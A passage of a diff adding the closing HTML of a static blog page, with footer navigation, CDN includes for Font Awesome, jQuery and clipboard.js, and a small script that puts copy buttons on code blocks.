+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Stoocea">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
